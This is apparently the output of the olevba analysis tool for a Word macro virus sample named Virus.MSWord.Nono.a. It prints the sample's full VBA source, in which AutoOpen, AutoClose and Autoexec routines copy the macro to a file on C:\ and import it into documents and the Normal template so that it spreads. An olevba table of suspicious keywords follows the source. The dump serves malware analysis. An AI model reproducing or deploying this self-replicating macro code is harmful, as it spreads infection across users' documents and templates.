olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nono.a-d317d6559c898977ab3b12ba49bcf4e5ac877083
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nono.a-d317d6559c898977ab3b12ba49bcf4e5ac877083 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
If ActiveDocument.VBProject.VBComponents.Item(2).Name = Application.UserInitials Then
If Dir("c:\" + Application.UserInitials) <> Application.UserInitials Then
ActiveDocument.VBProject.VBComponents.Item(x).Export "c:\" + Application.UserInitials
End If
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems
End If
Out:
End Sub
Sub AutoClose()
On Error Resume Next
ActiveDocument.VBProject.VBComponents.Import ("c:\" + Application.UserInitials)
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub ToolsMacro()
End Sub
Sub ViewVBCode()
End Sub
Sub Autoexec()
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
Open "c:\v1.bas" For Output As 1
Print #1, "Attribute VB_Name = ""v1"""
Print #1, "Sub AutoOpen()"
Print #1, "ActiveDocument.VBProject.VBComponents.Import (""c:\"" + Application.UserInitials)"
Print #1, "End Sub"
Close 1
NormalTemplate.VBProject.VBComponents.Import ("c:\v1.bas")
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

